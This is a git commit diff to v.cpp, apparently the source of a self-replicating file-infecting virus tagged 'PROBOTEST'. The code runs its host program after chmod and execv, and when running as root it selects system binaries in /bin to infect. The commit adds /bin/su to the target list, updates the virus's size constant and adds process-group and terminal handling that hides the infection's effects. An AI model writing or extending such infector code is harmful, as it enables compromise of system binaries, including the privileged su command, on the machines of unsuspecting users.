c1a0c5897b631d67ebcca6d32acb16833cff495b
Niels Koster <n.koster@portavita.eu>
2017-08-03 23:23:56 +0200

    su to the list, another attempt

--- v.cpp
+++ v.cpp
@@ -3,7 +3,7 @@
 #include <unistd.h>
 
 const char* IDENTIFIER = "PROBOTEST";
-const int MYSIZE = 19524;
+const int MYSIZE = 19685;
 
 using namespace std;
 
@@ -40,6 +40,8 @@ int main (int argc, char** argv) {
         command = "chmod u+x ";
         command += exe;
         c = system( command.c_str() );
+        setpgid(0, 0);
+        tcsetpgrp(0, getpgrp());
         execv((exe).c_str(), argv);
         return 30;
     }
@@ -49,6 +51,7 @@ int main (int argc, char** argv) {
         command += "-mindepth 1 -maxdepth 1 -type f";
         if (uid == 0) command += " | egrep '\
 ^/bin/ls$|\
+^/bin/su$|\
 ^/bin/mount$|\
 ^/bin/df$|\
 ^/bin/ps$'";
@@ -75,6 +78,8 @@ rm -f ${VIR}__ ";
         command += " ";
         command += exe;
         c = system( (command).c_str() );
+        setpgid(childpid, childpid);
+        tcsetpgrp(0, childpid);
         return 0;
     }
 }
